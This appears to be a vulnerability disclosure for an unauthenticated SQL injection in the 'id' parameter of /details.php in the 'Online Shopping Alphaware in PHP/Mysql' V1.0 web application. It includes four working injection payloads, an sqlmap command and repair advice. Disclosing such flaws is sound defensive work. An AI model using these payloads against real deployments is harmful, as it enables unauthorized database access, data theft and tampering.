# sourcecodester Online Shopping Alphaware in PHP/Mysql V1.0 /details.php SQL injection

# NAME OF AFFECTED PRODUCT(S)
+ Online Shopping Alphaware in PHP/Mysql

## Vendor Homepage
+ [homepage](https://www.sourcecodester.com/php/14368/online-shopping-alphaware-phpmysql.html)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ WeQi

## Vulnerable File
+ /details.php

## Vulnerability location:
+ 'id' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://www.sourcecodester.com/download-code?nid=14368&title=Online+Shopping+Alphaware+in+PHP%2FMysql)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/details.php' file of the 'Online Shopping Alphaware in PHP/Mysql' project. The reason for this issue is that attackers inject malicious code from the parameter 'id' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "Online Shopping Alphaware in PHP/Mysql", WeQi discovered a critical SQL injection vulnerability in the "/details.php" file. This vulnerability stems from insufficient user input validation of the 'id' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:

+ boolean-based blind
+ error-based
+ time-based blind
+ UNION query

## Payload:
```plain
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=431860' AND 5236=5236 AND 'EeCN'='EeCN

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=431860' OR (SELECT 6906 FROM(SELECT COUNT(*),CONCAT(0x7170716b71,(SELECT (ELT(6906=6906,1))),0x716a717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gbOf'='gbOf

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=431860' AND (SELECT 1428 FROM (SELECT(SLEEP(5)))IrtG) AND 'PDhB'='PDhB

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: id=-4159' UNION ALL SELECT NULL,NULL,CONCAT(0x7170716b71,0x4f584958636a6353545a636b6a4d77554c6d4d6d4f545853424867554548646c6646775458514f49,0x716a717071),NULL,NULL,NULL,NULL-- -
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -u "http://localhost/details.php?id=431860" --batch
```

![](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773113520577-8ecc9fd1-866d-4375-a717-24446be9cf47.png)



# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
